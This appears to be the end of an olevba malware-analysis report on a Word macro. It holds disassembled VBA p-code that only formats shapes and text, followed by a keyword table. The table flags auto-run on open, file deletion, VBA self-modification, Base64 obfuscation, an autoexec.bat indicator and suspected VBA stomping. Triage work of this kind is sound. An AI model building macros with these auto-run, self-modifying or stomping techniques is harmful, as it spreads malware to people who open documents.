' 	LitR8 0x0000 0x0000 0x8000 0x4066 
' 	ArgsMemCallWith IncrementRotation 0x0001 
' Line #145:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #146:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	Ld msoGradientFire 
' 	MemLdWith Fill 
' 	ArgsMemCall PresetGradient 0x0003 
' Line #147:
' 	Ld msoSendBehindText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #148:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #149:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #150:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #151:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #152:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0010 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #153:
' 	LitStr 0x000B "Version 1.1"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #154:
' 	EndWith 
' Line #155:
' 	Ld aShape 
' 	MemLd New 
' 	MemLdWith New 
' 	ArgsArray Array 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #156:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Group 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #157:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

